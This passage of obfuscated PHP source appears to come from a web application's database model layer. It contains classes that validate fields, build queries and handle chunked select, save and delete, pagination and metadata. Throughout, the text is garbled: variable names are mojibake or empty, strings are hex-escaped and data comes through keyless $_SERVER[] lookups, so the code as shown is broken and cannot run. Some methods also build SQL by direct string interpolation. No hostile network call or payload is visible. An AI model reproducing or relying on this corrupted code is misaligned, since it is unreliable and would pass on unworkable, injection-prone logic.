($Ó¥ç[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($, $Ó¥ç)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($[22] != trim($[$Ó¥ç[0]])) { if (!1 === $this->_validationField($, $Ó¥ç)) { return !1; } } break; default: if (isset($[$Ó¥ç[0]])) { if (!1 === $this->_validationField($, $Ó¥ç)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Îäñ, $) { if (!1 === $this->_validationFieldItem($Îäñ, $)) { if ($this->patchValidate) { $this->error[$[0]] = $[2]; } else { $this->error = $[2]; return !1; } } return; } protected function _validationFieldItem($Œº–¶, $) { $ =& $_SERVER[]; switch (strtolower(trim($[4]))) { case $[374]: case $[375]: $¬Ø“É = isset($[6]) ? (array) $[6] : array(); if (is_string($[0]) && strpos($[0], $[60])) { $[0] = explode($[60], $[0]); } if (is_array($[0])) { foreach ($[0] as $) { $¬≥[$] = $Œº–¶[$]; } array_unshift($¬Ø“É, $¬≥); } else { array_unshift($¬Ø“É, $Œº–¶[$[0]]); } if ($[374] == $[4]) { return call_user_func_array($[1], $¬Ø“É); } else { return call_user_func_array(array(&$this, $[1]), $¬Ø“É); } case $[382]: return $Œº–¶[$[0]] == $Œº–¶[$[1]]; case $[383]: if (is_string($[0]) && strpos($[0], $[60])) { $[0] = explode($[60], $[0]); } $‘º = array(); if (is_array($[0])) { foreach ($[0] as $) { $‘º[$] = $Œº–¶[$]; } } else { $‘º[$[0]] = $Œº–¶[$[0]]; } if (!empty($Œº–¶[$this->getPk()])) { $‘º[$this->getPk()] = array($[384], $Œº–¶[$this->getPk()]); } if ($this->where($‘º)->find()) { return !1; } return !0; default: return $this->check($Œº–¶[$[0]], $[1], $[4]); } } public function check($, $Ÿ¢, $◊π = "\162\145\x67\x65\x78") { $ =& $_SERVER[]; $◊π = strtolower(trim($◊π)); switch ($◊π) { case $[17]: case $[385]: $ = is_array($Ÿ¢) ? $Ÿ¢ : explode($[60], $Ÿ¢); return $◊π == $[17] ? in_array($, $) : !in_array($, $); case $[386]: case $[387]: if (is_array($Ÿ¢)) { $ = $Ÿ¢[0]; $ = $Ÿ¢[1]; } else { list($, $) = explode($[60], $Ÿ¢); } return $◊π == $[386] ? $ >= $ && $ <= $ : $ < $ || $ > $; case $[388]: case $[389]: return $◊π == $[388] ? $ == $Ÿ¢ : $ != $Ÿ¢; case $[390]: $‹î = mb_strlen($, $[391]); if (strpos($Ÿ¢, $[60])) { list($, $) = explode($[60], $Ÿ¢); return $‹î >= $ && $‹î <= $; } else { return $‹î == $Ÿ¢; } case $[392]: list($ﬂû, $Àß) = explode($[60], $Ÿ¢); if (!is_numeric($ﬂû)) { $ﬂû = strtotime($ﬂû); } if (!is_numeric($Àß)) { $Àß = strtotime($Àß); } return NOW_TIME >= $ﬂû && NOW_TIME <= $Àß; case $[393]: return in_array(get_client_ip(), explode($[60], $Ÿ¢)); case $[394]: return !in_array(get_client_ip(), explode($[60], $Ÿ¢)); case $[381]: default: return $this->regex($, $Ÿ¢); } } public function query($…ì, $ﬂâ = false) { $◊¶≈≠ =& $_SERVER[]; if (!is_bool($ﬂâ) && !is_array($ﬂâ)) { $ﬂâ = func_get_args(); array_shift($ﬂâ); } $…ì = str_replace(array($◊¶≈≠[11], $◊¶≈≠[395]), $◊¶≈≠[63], $…ì); $…ì = $this->parseSql($…ì, $ﬂâ); return $this->db->query($…ì); } public function execute($, $ = false) { if (!is_bool($) && !is_array($)) { $ = func_get_args(); array_shift($); } $ = $this->parseSql($, $); return $this->db->execute($); } protected function parseSql($“ú, $Œ¢) { $ =& $_SERVER[]; if (!0 === $Œ¢) { $“â = $this->_parseOptions(); $“ú = $this->db->parseSql($“ú, $“â); } elseif (is_array($Œ¢)) { $Œ¢ = array_map(array($this->db, $[396]), $Œ¢); $“ú = vsprintf($“ú, $Œ¢); } else { $“ú = strtr($“ú, array($[397] => $this->getTableName(), $[398] => think_config($[297]))); } $this->db->setModel($this->name); return $“ú; } public function db($ = '', $Ÿî = '', $«É = array()) { $‹ï =& $_SERVER[]; if ($‹ï[22] === $ && $this->db) { return $this->db; } static $€Ω = array(); static $«Æ = array(); if (!isset($«Æ[$]) || isset($«Æ[$]) && $Ÿî && $€Ω[$] != $Ÿî) { if (!empty($Ÿî) && is_string($Ÿî) && !1 === strpos($Ÿî, $‹ï[18])) { $Ÿî = think_config($Ÿî); } $ = think_guid($Ÿî); $«Æ[$] = Db::getInstance($Ÿî); } elseif (NULL === $Ÿî) { $«Æ[$]->close(); unset($«Æ[$]); return; } if (!empty($«É)) { if (is_string($«É)) { parse_str($«É, $«É); } foreach ($«É as $»Ω => $∆∂»≥) { $this->setProperty($»Ω, $∆∂»≥); } } $€Ω[$] = $Ÿî; $this->db = $«Æ[$]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ = get_class($this); if ($ == $_SERVER[][399]) { return $this->name; } $this->name = substr($, 0, -5); } return $this->name; } public function getTableName() { $ =& $_SERVER[]; if (empty($this->trueTableName)) { $ = !empty($this->tablePrefix) ? $this->tablePrefix : $[22]; if (!empty($this->tableName)) { $ .= $this->tableName; } else { $ .= think_parse_name($this->name); } $this->trueTableName = strtolower($); } return (!empty($this->dbName) ? $this->dbName . $[20] : $[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $√î =& $_SERVER[]; return isset($this->fields[$√î[304]]) ? $this->fields[$√î[304]] : $this->pk; } public function getDbFields() { $ =& $_SERVER[]; if (isset($this->options[$[332]])) { $Ô§Å = $this->db->getFields($this->options[$[332]]); return $Ô§Å ? array_keys($Ô§Å) : !1; } if ($this->fields) { $Ô§Å = $this->fields; unset($Ô§Å[$[303]], $Ô§Å[$[304]], $Ô§Å[$[305]], $Ô§Å[$[302]]); return $Ô§Å; } return !1; } public function data($Œî = '') { $‰úá =& $_SERVER[]; if ($‰úá[22] === $Œî && !empty($this->data)) { return $this->data; } if (is_object($Œî)) { $Œî = get_object_vars($Œî); } elseif (is_string($Œî)) { parse_str($Œî, $Œî); } elseif (!is_array($Œî)) { think_exception(think_lang($‰úá[324])); } $this->data = $Œî; return $this; } public function join($‹±‘±) { $“• =& $_SERVER[]; if (is_array($‹±‘±)) { $this->options[$“•[335]] = $‹±‘±; } elseif (!empty($‹±‘±)) { $this->options[$“•[335]][] = $‹±‘±; } return $this; } public function union($, $Óóâ = false) { $ =& $_SERVER[]; if (empty($)) { return $this; } if ($Óóâ) { $this->options[$[400]][$[401]] = !0; } if (is_object($)) { $ = get_object_vars($); } if (is_string($)) { $⁄∂◊ö = $; } elseif (is_array($)) { if (isset($[0])) { $this->options[$[400]] = array_merge($this->options[$[400]], $); return $this; } else { $⁄∂◊ö = $; } } else { think_exception(think_lang($[324])); } $this->options[$[400]][] = $⁄∂◊ö; return $this; } public function cache($ = true, $ﬁÑ = null, $ = '') { $ é =& $_SERVER[]; if (!1 !== $) { $this->options[$ é[402]] = array($ é[104] => $, $ é[392] => $ﬁÑ, $ é[43] => $); } return $this; } public function field($ÿë, $–ä÷å = false) { $◊æ =& $_SERVER[]; if (!0 === $ÿë) { $ = $this->getDbFields(); $ÿë = $ ? $ : $◊æ[213]; } elseif ($–ä÷å) { if (is_string($ÿë)) { $ÿë = explode($◊æ[60], $ÿë); } $ = $this->getDbFields(); $ÿë = $ ? array_diff($, $ÿë) : $ÿë; } $this->options[$◊æ[326]] = $ÿë; return $this; } public function scope($·åû = '', $ = NULL) { $ =& $_SERVER[]; if ($[22] === $·åû) { if (isset($this->_scope[$[47]])) { $ = $this->_scope[$[47]]; } else { return $this; } } elseif (is_string($·åû)) { $ = explode($[60], $·åû); $ = array(); foreach ($ as $) { if (!isset($this->_scope[$])) { continue; } $ = array_merge($, $this->_scope[$]); } if (!empty($) && is_array($)) { $ = array_merge($, $); } } elseif (is_array($·åû)) { $ = $·åû; } if (is_array($) && !empty($)) { $this->options = array_merge($this->options, array_change_key_case($)); } return $this; } public function where($—ò—Ö, $ = null) { $€å =& $_SERVER[]; if (!is_null($) && is_string($—ò—Ö)) { if (!is_array($)) { $ = func_get_args(); array_shift($); } $ = array_map(array($this->db, $€å[396]), $); $—ò—Ö = vsprintf($—ò—Ö, $); } elseif (is_object($—ò—Ö)) { $—ò—Ö = get_object_vars($—ò—Ö); } elseif (is_array($—ò—Ö)) { foreach ($—ò—Ö as $ => $Ãµ) { if ((is_numeric($) || !$) && is_string($Ãµ)) { if (strpos($Ãµ, $€å[403]) === 0) { continue; } think_trace($€å[404], $€å[22], $€å[59]); die; } } } if (is_string($—ò—Ö) && $€å[22] != $—ò—Ö) { $ = array(); $[$€å[405]] = $—ò—Ö; $—ò—Ö = $; } if (isset($this->options[$€å[328]])) { $this->options[$€å[328]] = array_merge($this->options[$€å[328]], $—ò—Ö); } else { $this->options[$€å[328]] = $—ò—Ö; } return $this; } public function limit($≈±, $◊µ = null) { $—∏ =& $_SERVER[]; $this->options[$—∏[345]] = is_null($◊µ) ? $≈± : $≈± . $—∏[60] . $◊µ; return $this; } public function page($, $Œ§ = null) { $≈£ =& $_SERVER[]; $this->options[$≈£[406]] = is_null($Œ§) ? $ : $ . $≈£[60] . $Œ§; return $this; } public function comment($) { $this->options[$_SERVER[][407]] = $; return $this; } public function setProperty($Ï®¥, $Õà) { if (property_exists($this, $Ï®¥)) { $this->{$Ï®¥} = $Õà; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\x73\145\x72\164\x2c\x75\160\x64\141\x74\x65", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x63\162\145\141\x74\x65\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\143\x74\151\x6f\x6e")); public function setDataAuto($) { $this->dataAuto = $; } public function __construct($’ë = '', $ = '', $ﬁ® = '') { parent::__construct($’ë, $, $ﬁ®); } protected $tableMeta = array(); protected function _beforeInsert(&$Î∑á, $Ã¨) { $ƒô =& $_SERVER[]; if (!$this->checkDataAutoHas($ƒô[408])) { return; } $this->dataBeforeFilter($Î∑á, $ƒô[408]); } protected function _beforeUpdate(&$, $Õó) { $Ê¨ø =& $_SERVER[]; if (!$this->checkDataAutoHas($Ê¨ø[409])) { return; } $this->dataBeforeFilter($, $Ê¨ø[409]); } protected function _afterSelect(&$, $◊á) { if (!is_array($)) { return; } if (!$this->checkDataAutoHas($_SERVER[][410])) { return; } foreach ($ as &$Ãñ) { $this->dataAfterFilter($Ãñ); } unset($Ãñ); } protected function _afterFind(&$√ç, $) { if (!is_array($√ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[][410])) { return; } $this->dataAfterFilter($√ç); } public static function textEncode($Úì∑§) { if (!$Úì∑§) { return $Úì∑§; } $ = json_encode($Úì∑§); $ = preg_replace_callback($_SERVER[][411], function ($) { return addslashes($[0]); }, $); return json_decode($); } public static function textDecode($Ã¥) { $ =& $_SERVER[]; $ ß = json_encode($Ã¥); $ ß = preg_replace_callback($[412], function ($) { return $_SERVER[][107]; }, $ ß); return json_decode($ ß); } public function setAutoIncrement($“Ö) { $Õ± = array($this->getPk() => $“Ö); $ ù = $this->data($Õ±)->add(); if ($ ù) { $this->delete($ ù); } } public function getAutoIncrement() { $ = $this->getTableName(); $∆ñ = $this->max($this->getPk()); $ = $this->query("\x73\x68\x6f\x77\40\164\x61\x62\x6c\145\40\163\164\141\164\x75\x73\40\167\x68\145\x72\145\x20\x4e\141\155\145\75\x27{$}\47"); $ﬂü = $[0][$_SERVER[][413]]; $œ∫ = max($∆ñ, $ﬂü); return $œ∫; } protected function _callBefore($’ù, $—æ¬£) { return $this->cacheCallCheck($’ù, $—æ¬£, !1); } protected function _callAfter($“º, $…è) { return $this->cacheCallCheck($“º, $…è, !0); } protected function cacheFunctionAlias($«ò) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($, $, $Ÿµ…â = false) { $—â€ï = $this->cacheFunctionAlias($); if (!$—â€ï) { return; } foreach ($—â€ï as $ => $) { $‘† = $[0]; $ = explode($_SERVER[][60], $[1]); if ($ == $) { return $this->cacheFunctionGet($, $‘†); } if ($Ÿµ…â && in_array($, $)) { $this->cacheFunctionClear($, $‘†); } } } public function cacheFunctionGet($ÃÉ, $) { $Òì∏£ = $this->cacheKeyMake($ÃÉ, $); $È¨µ = Cache::get($Òì∏£); if (!is_array($È¨µ)) { $È¨µ = call_user_func_array(array($this, $ÃÉ), array($, !0)); Cache::set($Òì∏£, $È¨µ); } return $È¨µ; } public function cacheFunctionClear($ÓΩ®, $Ãï) { $‹ÖÒ≥≥ï = $Ãï; if (!is_array($Ãï)) { $‹ÖÒ≥≥ï = array($Ãï); } foreach ($‹ÖÒ≥≥ï as $) { $…ã = $this->cacheKeyMake($ÓΩ®, $); Cache::remove($…ã); } } private function cacheKeyMake($Èüª, $“ü) { $ =& $_SERVER[]; return get_class($this) . $[21] . $Èüª . $[414] . $“ü; } protected function selectPageReset() { $Î±Ö =& $_SERVER[]; if (isset($GLOBALS[$Î±Ö[415]])) { return; } $GLOBALS[$Î±Ö[415]] = isset($GLOBALS[$Î±Ö[17]][$Î±Ö[416]]) ? $GLOBALS[$Î±Ö[17]][$Î±Ö[416]] : !1; $GLOBALS[$Î±Ö[417]] = isset($GLOBALS[$Î±Ö[17]][$Î±Ö[406]]) ? $GLOBALS[$Î±Ö[17]][$Î±Ö[406]] : !1; $GLOBALS[$Î±Ö[17]][$Î±Ö[416]] = !1; $GLOBALS[$Î±Ö[17]][$Î±Ö[406]] = !1; } protected function selectPageRestore() { $∆Öﬂõ =& $_SERVER[]; if (!isset($GLOBALS[$∆Öﬂõ[415]])) { return; } $GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[416]] = $GLOBALS[$∆Öﬂõ[415]]; $GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[406]] = $GLOBALS[$∆Öﬂõ[417]]; if ($GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[416]] === !1) { unset($GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[416]]); } if ($GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[406]] === !1) { unset($GLOBALS[$∆Öﬂõ[17]][$∆Öﬂõ[406]]); } unset($GLOBALS[$∆Öﬂõ[415]]); unset($GLOBALS[$∆Öﬂõ[417]]); } protected function selectPage($≈Ñ«û = 200, $€° = 1) { $ =& $_SERVER[]; global $in; $ = $this->optionsValue(); $ = 50000; $≈Ñ«û = isset($in[$[416]]) && $in[$[416]] ? $in[$[416]] : $≈Ñ«û; if ($≈Ñ«û === -1) { $in[$[416]] = !1; $ = 100000000; $≈Ñ«û = $; } $ = $; $[$[418]] = array(); $≈Ñ«û = intval($≈Ñ«û); $≈Ñ«û = $≈Ñ«û <= 5 ? 5 : ($≈Ñ«û >= $ ? $ : $≈Ñ«û); $€° = intval(isset($in[$[406]]) && $in[$[406]] ? $in[$[406]] : $€°); $€° = $€° <= 1 ? 1 : $€°; $ = array(); $ﬁØ = 1; if ($€° == 1 && $ﬁØ) { $this->optionsValue($); $ = $this->page($€°, $≈Ñ«û)->select(); $»± = is_array($) ? count($) : 0; if ($»± < $≈Ñ«û) { $–æ = 1; } else { $this->optionsValue($); $»± = intval($this->count()); $–æ = ceil($»± / $≈Ñ«û); } } else { $this->optionsValue($); $»± = intval($this->count()); $–æ = ceil($»± / $≈Ñ«û); $€° = $€° >= $–æ ? $–æ : $€°; $this->optionsValue($); $ = $this->page($€°, $≈Ñ«û)->select(); } if (!is_array($)) { $ = array(); } if ($–æ == 1) { $»± = count($); } $‚∫≤ = array($[419] => array($[420] => $»±, $[416] => $≈Ñ«û, $[406] => $€°, $[421] => $–æ), $[422] => $); return $‚∫≤; } protected function checkLength($, $”¢ = 0, $ = '') { $–úﬁ≥ =& $_SERVER[]; $”¢ = $”¢ ? $”¢ : 65536; if (!$ || strlen($) < $”¢) { return; } $ = $ ? $ . $–úﬁ≥[81] : $–úﬁ≥[22]; show_json($ . LNG($–úﬁ≥[423]) . "\50{$”¢}\x29", !1); } protected function metaSet($÷Ö, $ = null, $‹£ = null) { $€ñ =& $_SERVER[]; if (!$this->tableMeta || !$÷Ö) { return !1; } $ õ‘£ = $this->tableMeta[$€ñ[424]]; $⁄∏ = $this->tableMeta[$€ñ[425]]; $ = Model($⁄∏); $ = array($ õ‘£ => $÷Ö, $€ñ[426] => $); if (is_null($)) { return $->where(array($ õ‘£ => $÷Ö))->delete(); } if (is_null($‹£) && is_string($)) { return $->where($)->delete(); } $ = is_array($) ? $ : array(); if (is_string($)) { $[$] = $‹£; } $ÔÑæ = array(); foreach ($ as $Õá => $◊ô) { if (is_null($◊ô) && is_string($Õá)) { $->where(array($ õ‘£ => $÷Ö, $€ñ[426] => $Õá))->delete(); continue; } $this->checkLength($◊ô, !1, $⁄∏ . $€ñ[4] . $Õá); $ÔÑæ[] = array($ õ‘£ => $÷Ö, $€ñ[104] => $Õá, $€ñ[427] => $◊ô); } $ = $€ñ[428] . $⁄∏; CacheLock::lock($); $->where(array($ õ‘£ => $÷Ö))->addAll($ÔÑæ, array(), !0); CacheLock::unlock($); return !0; } public function metaGet($Õ±, $⁄∑ = false) { $„ï´€∫ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $ = $this->tableMeta[$„ï´€∫[424]]; $ = Model($this->tableMeta[$„ï´€∫[425]]); if ($⁄∑) { $ = array($ => $Õ±, $„ï´€∫[104] => $⁄∑); return $->where($)->getField($„ï´€∫[427]); } $ = array($ => $Õ±); $‚ûÇœê = $->field($„ï´€∫[429])->where($)->select(); $‚ûÇœê = array_to_keyvalue($‚ûÇœê, $„ï´€∫[104], $„ï´€∫[427]); return $‚ûÇœê; } private function checkDataAutoHas($”Å) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $) { if (in_array($”Å, explode($_SERVER[][60], $[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$€∫„≠Ç, $) { $›å =& $_SERVER[]; if (!is_array($€∫„≠Ç)) { return; } foreach ($this->dataAuto as $∆î) { $»° = $∆î[0]; if (!in_array($, explode($›å[60], $∆î[2]))) { continue; } switch (trim($∆î[3])) { case $›å[374]: case $›å[375]: $ﬂÅ = $∆î[1]; $“° Ñ = isset($∆î[4]) ? (array) $∆î[4] : array(); if ($ﬂÅ == $›å[204] && array_key_exists($»°, $€∫„≠Ç)) { if (!$€∫„≠Ç[$»°]) { unset($€∫„≠Ç[$»°]); } break; } if (isset($€∫„≠Ç[$»°])) { array_unshift($“° Ñ, $€∫„≠Ç[$»°]); } if ($›å[374] == $∆î[3]) { $€∫„≠Ç[$»°] = call_user_func_array($ﬂÅ, $“° Ñ); } else { $€∫„≠Ç[$»°] = call_user_func_array(array(&$this, $ﬂÅ), $“° Ñ); } break; case $›å[323]: if (isset($€∫„≠Ç[$»°]) && $€∫„≠Ç[$»°]) { $€∫„≠Ç[$»°] = call_user_func_array(array(&$this, $∆î[1]), array($€∫„≠Ç[$»°])); } break; case $›å[326]: $€∫„≠Ç[$»°] = $€∫„≠Ç[$∆î[1]]; break; case $›å[347]: if (isset($€∫„≠Ç[$»°]) && !is_string($€∫„≠Ç[$»°])) { $€∫„≠Ç[$»°] = json_encode_force($€∫„≠Ç[$»°]); } break; case $›å[376]: if ($€∫„≠Ç[$»°] === $›å[22]) { unset($€∫„≠Ç[$»°]); } break; case $›å[377]: $€∫„≠Ç[$»°] = $∆î[1]; default: break; } } if ($ == $›å[408]) { $ = strtolower($this->db->getDbType()); if (strpos($, $›å[23]) !== 0) { return; } $ = $this->field(!0)->fields; $ = $[$›å[305]]; if (isset($[$›å[304]])) { unset($[$[$›å[304]]]); } foreach ($ as $ => $) { if (!isset($€∫„≠Ç[$])) { $€∫„≠Ç[$] = $›å[22]; } } } } private function dataAfterFilter(&$) { $∆∞ =& $_SERVER[]; foreach ($this->dataAuto as $◊ö) { $¬á = $◊ö[0]; if (!isset($[$¬á])) { continue; } if (!in_array($∆∞[410], explode($∆∞[60], $◊ö[2]))) { continue; } switch (trim($◊ö[3])) { case $∆∞[374]: case $∆∞[375]: $«ã = isset($◊ö[4]) ? (array) $◊ö[4] : array(); array_unshift($«ã, $[$¬á]); if (isset($◊ö[4]) && $◊ö[4] == $∆∞[430]) { $«ã = array($[$¬á]); } if ($∆∞[374] == $◊ö[3]) { $[$¬á] = call_user_func_array($◊ö[1], $«ã); } else { $[$¬á] = call_user_func_array(array(&$this, $◊ö[1]), $«ã); } break; case $∆∞[323]: if (isset($[$¬á]) && $[$¬á]) { $[$¬á] = call_user_func_array(array(&$this, $◊ö[1]), array($[$¬á])); } break; case $∆∞[326]: $[$¬á] = $[$◊ö[1]]; break; case $∆∞[347]: $ = $[$¬á]; $[$¬á] = json_decode($, !0); if (is_null($[$¬á])) { $[$¬á] = $; } break; case $∆∞[376]: if ($[$¬á] === $∆∞[22]) { unset($[$¬á]); } break; case $∆∞[377]: $[$¬á] = $◊ö[1]; break; default: break; } } } public function saveAll($„çÅ) { $…Ö =& $_SERVER[]; $÷´ = $this->tablePrefix . $this->tableName; $…ç = self::SQL_WHERE_IN_CHUNK; $„çÅ = is_array($„çÅ) ? $„çÅ : array(); $ = $…Ö[431]; $⁄Ç = 0; $ = array(); $ = count($„çÅ); for ($Á™à = 0; $Á™à < $; $Á™à++) { $ = $„çÅ[$Á™à]; if (!is_array($) || count($) != 4) { continue; } $È∑¥ = "\125\x50\x44\101\124\105\x20\x60{$÷´}\x60\40\123\105\124\40{$[2]}\40\x3d\x20\x43\101\123\x45\x20{$[0]}\x20\12"; if ($⁄Ç == 0) { $ = $È∑¥; } $[] = $…Ö[128] . $[1] . $…Ö[128]; $⁄Ç++; $ .= "\40\x57\x48\x45\x4e\x20\x27{$[1]}\x27\40\x54\110\x45\x4e\40\x27{$[3]}\47\x20\12"; if ($⁄Ç == $…ç || $Á™à == $ - 1) { $ = implode($…Ö[60], $); $ .= "\x20\x45\116\104\40\40\127\110\x45\x52\105\x20{$[0]}\40\111\116\40\50{$}\x29\x20"; $this->execute($); $⁄Ç = 0; $ = $È∑¥; $this->chunkEventCheck(count($)); $ = array(); } } $this->chunkEventSet(); } public function saveAllEach($) { $ﬂÅÿè =& $_SERVER[]; $√ª = $this->tablePrefix . $this->tableName; foreach ($ as $œã) { if (!is_array($œã) || count($œã) != 4) { continue; } $›ª = $œã[0] . $ﬂÅÿè[432] . $œã[1] . $ﬂÅÿè[128]; $√ì = $œã[2] . $ﬂÅÿè[432] . $œã[3] . $ﬂÅÿè[128]; $Àì = "\x75\160\144\x61\x74\145\x20{$√ª}\x20\x73\x65\x74\x20{$√ì}\40\167\150\x65\162\145\40{$›ª}\x3b"; $this->execute($Àì); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($”Ñ = false, $Ÿê∆å = false) { $this->_chunkEvent = $”Ñ; $this->_chunkEventParam = $Ÿê∆å; } private function chunkEventCheck($÷º) { if (!$this->_chunkEvent) { return; } $ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $[$_SERVER[][433]] = $÷º; Hook::trigger($this->_chunkEvent, $); } public function addAll($, $ = array(), $ƒ§ = false) { $“≤ =& $_SERVER[]; ignore_timeout(); $“∫÷Æ = self::SQL_WHERE_IN_CHUNK; if (empty($)) { $this->error = think_lang($“≤[324]); return !1; } $ = $this->_parseOptions($); foreach ($ as $‘ª => $) { $[$‘ª] = $this->_facade($); $this->_beforeInsert($[$‘ª], $); } if (method_exists($this->db, $“≤[325])) { for ($ = 0; $ < count($); $ += $“∫÷Æ) { $»ù ó = array_slice($, $, $“∫÷Æ); if (!is_array($»ù ó) || count($»ù ó) == 0) { break; } $ = $this->db->insertAll($»ù ó, $, $ƒ§); $this->chunkEventCheck(count($»ù ó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ as $‘ª => $) { $ = $this->db->insert($, $, $ƒ§); } $this->commit(); } if (!1 !== $) { $ = $this->getLastInsID(); if ($) { return $; } } return $; } public function save($’π = '', $ = array()) { $ƒå =& $_SERVER[]; $ = self::SQL_WHERE_IN_CHUNK; $Õî = $this->optionsValue(); $“ê¬â = $this->findWhereField($Õî); if (!$“ê¬â) { return parent::save($’π, $); } $ = 0; $ = $Õî[$ƒå[328]][$“ê¬â][1]; $ = is_array($) ? $ : array(); $ = count($); for ($Œ¶Íúô = 0; $Œ¶Íúô < $; $Œ¶Íúô += $) { $œè = array_slice($, $Œ¶Íúô, $); if (!is_array($œè) || count($œè) == 0) { break; } $Õî[$ƒå[328]][$“ê¬â][1] = $œè; $this->optionsValue($Õî); $ += parent::save($’π, $); $this->chunkEventCheck(count($œè)); } $this->chunkEventSet(); return $; } public function add($ﬂ• = '', $ÏüÄ = array(), $€î = false) { if ($this->addTaskStatus && is_array($ﬂ•)) { $this->addTaskData[] = $ﬂ•; return; } return parent::add($ﬂ•, $ÏüÄ, $€î); } public function parseWhereLike($, $—ø = '', $’≥ = false, &$ÂïÜ = false) { $ =& $_SERVER[]; $ = $GLOBALS[$[16]][$[434]]; if (!$[$[435]]) { return $; } if (!is_array($)) { return $; } $œå = array(); $›â»• = 0; foreach ($ as $‹û—å => $÷∏) { if (is_array($÷∏) && count($÷∏) == 2 && $÷∏[0] == $[436] && is_string($÷∏[1]) && substr($÷∏[1], 0, 1) == $[437] && substr($÷∏[1], strlen($÷∏[1]) - 1, 1) == $[437]) { $ÂïÜ = !0; $ = is_string($‹û—å) ? $‹û—å : $—ø; $À¥ = substr($÷∏[1], 1, strlen($÷∏[1]) - 2); $À¥ = $this->db->escapeString($À¥); if (!strpos($, $[20])) { $ = $[438] . $ . $[438]; } $ƒ®ﬂó = $[213] . $À¥ . $[213]; $À¥ = str_replace(array($[20], $[439], $[21]), $[440], $À¥); if ($[$[441]]) { $ƒ®ﬂó = $[442] . $À¥ . $[443]; if ($[$[444]]) { $ƒ®ﬂó = $[443] . $À¥ . $[442]; } } $œå[$›â»•] = $[445] . $ . $[446] . $ƒ®ﬂó . $[447]; $›â»•++; continue; } if (is_array($÷∏)) { $—ø = is_string($‹û—å) ? $‹û—å : $—ø; $÷∏ = $this->parseWhereLike($÷∏, $—ø, !0, $ÂïÜ); } if (is_numeric($‹û—å)) { $œå[$›â»•] = $÷∏; $›â»•++; } else { $œå[$‹û—å] = $÷∏; } } if ($ÂïÜ && !$’≥) { } return $œå; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Œó = array()) { $√ø =& $_SERVER[]; $ÏÖö = self::SQL_WHERE_IN_CHUNK; $ﬂπ = $this->optionsValue(); $‰¢† = $this->findWhereField($ﬂπ); if (!$‰¢† || isset($ﬂπ[$√ø[345]]) || isset($ﬂπ[$√ø[406]])) { return parent::select($Œó); } $÷Ö = $ﬂπ[$√ø[328]][$‰¢†][1]; $÷Ö = is_array($÷Ö) ? $÷Ö : array(); $ = null; for ($‹ç = 0; $‹ç < count($÷Ö); $‹ç += $ÏÖö) { $’∑ = array_slice($÷Ö, $‹ç, $ÏÖö); if (!is_array($’∑) || count($’∑) == 0) { break; } $ﬂπ[$√ø[328]][$‰¢†][1] = $’∑; $this->optionsValue($ﬂπ); $÷í = parent::select($Œó); if (!$÷í) { continue; } $ = is_array($) ? $ : array(); $ = array_merge($, $÷í); } return $; } public function delete($Îç§ = array()) { $Èü∂ =& $_SERVER[]; $„î∏ = self::SQL_WHERE_IN_CHUNK; $ÿ∞€∞ = $this->optionsValue(); $ = $this->findWhereField($ÿ∞€∞); if (!$) { return parent::delete($Îç§); } $ = 0; $“û = $ÿ∞€∞[$Èü∂[328]][$][1]; $“û = is_array($“û) ? $“û : array(); for ($ = 0; $ < count($“û); $ += $„î∏) { $ = array_slice($“û, $, $„î∏); if (!is_array($) || count($) == 0) { break; } $ÿ∞€∞[$Èü∂[328]][$][1] = $; $this->optionsValue($ÿ∞€∞); $ += parent::delete($Îç§); } return $; } private function findWhereField($) { $ =& $_SERVER[]; $Ãã = self::SQL_WHERE_IN_CHUNK; if (!is_array($) || !is_array($[$[328]])) { return !1; } foreach ($[$[328]] as $ŒØ => $) { if (is_array($) && isset($[0]) && is_string($[0]) && strtolower($[0]) == $[17] && is_array($[1]) && count($[1]) > $Ãã) { ignore_timeout(); return $ŒØ; } } return !1; } public function setMasterDB($–Ω = true) { think_config($_SERVER[][448], $–Ω); } } goto cÏØ•; E›¢ÿá: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($’é÷ã) { $ =& $_SERVER[]; return array($[1994] => array($[2383] . USER_ID, $[1995])); } protected function listData() { $≈á =& $_SERVER[]; $⁄§ = array($≈á[1676] => USER_ID, $≈á[534] => array($≈á[1998], 0)); $“≥ = $≈á[2384]; $›´ = $this->field($“≥)->where($⁄§)->order($≈á[2001])->select(); return $›´ ? $›´ : array(); } protected function addToTag($«¨, $Òìª≤) { $Ÿºœò =& $_SERVER[]; if 